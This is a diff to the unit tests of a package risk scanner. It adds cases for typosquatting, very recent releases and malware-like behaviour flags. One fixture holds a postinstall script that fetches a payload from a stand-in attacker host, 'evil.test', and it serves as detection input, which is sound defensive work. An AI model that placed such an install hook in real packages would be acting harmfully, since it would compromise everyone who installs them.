@@ -6,6 +6,8 @@ import { MissingRepoRule } from '../rules/missing-repo.js';
 import { MaintainerRule } from '../rules/maintainer.js';
 import { DownloadTrendsRule } from '../rules/downloads.js';
 import { BehavioralRule } from '../rules/behavioral.js';
+import { LifecycleScriptBehaviorRule } from '../rules/lifecycle-behavior.js';
+import { FreshReleaseRule } from '../rules/fresh-release.js';
 
 describe('RuleEngine', () => {
   it('should calculate scores correctly', () => {
@@ -20,7 +22,7 @@ describe('RuleEngine', () => {
 
     const report = engine.analyze(metadataWithScript as any);
     expect(report.score).toBe(20);
-    expect(report.severity).toBe('low');
+    expect(report.severity).toBe('high');
   });
 
   it('should detect typosquatting', () => {
@@ -28,8 +30,13 @@ describe('RuleEngine', () => {
     engine.registerRule(new TyposquatRule());
 
     const metadata = {
-      name: 'reactt', // typosquat of react
-      version: '1.0.0'
+      name: 'reactt',
+      version: '1.0.0',
+      nameRisk: {
+        target: 'react',
+        reason: 'Dynamic similarity check matched react with much stronger ecosystem signals',
+        confidence: 'high'
+      }
     };
 
     const report = engine.analyze(metadata as any);
@@ -94,13 +101,51 @@ describe('RuleEngine', () => {
       inspection: {
           hasObfuscation: true,
           suspiciousApis: ['child_process'],
-          envAccess: ['process.env access']
+          envAccess: ['process.env access'],
+          tlsBypass: true,
+          hiddenExecution: true,
+          detachedExecution: true,
+          remoteIpAccess: true,
+          homeDirectoryWrites: true,
+          selfDelete: true,
       }
     };
 
     const report = engine.analyze(metadata as any);
     expect(report.findings.some(f => f.id === 'behavioral-analysis')).toBe(true);
-    expect(report.score).toBe(60); // 25 + 20 + 15
+    expect(report.score).toBe(100);
+    expect(report.severity).toBe('critical');
+  });
+
+  it('should detect suspicious lifecycle script contents', () => {
+    const engine = new RuleEngine();
+    engine.registerRule(new LifecycleScriptBehaviorRule());
+
+    const metadata = {
+      name: 'test',
+      version: '1.0.0',
+      scripts: {
+        postinstall: 'node setup.cjs && curl https://evil.test/payload'
+      }
+    };
+
+    const report = engine.analyze(metadata as any);
+    expect(report.findings.some(f => f.id === 'lifecycle-script-behavior')).toBe(true);
+    expect(report.severity).toBe('critical');
+  });
+
+  it('should detect very recent releases', () => {
+    const engine = new RuleEngine();
+    engine.registerRule(new FreshReleaseRule());
+
+    const metadata = {
+      name: 'test',
+      version: '1.0.0',
+      published: new Date(Date.now() - 24 * 3600 * 1000).toISOString(),
+    };
+
+    const report = engine.analyze(metadata as any);
+    expect(report.findings.some(f => f.id === 'fresh-release')).toBe(true);
     expect(report.severity).toBe('high');
   });
 });
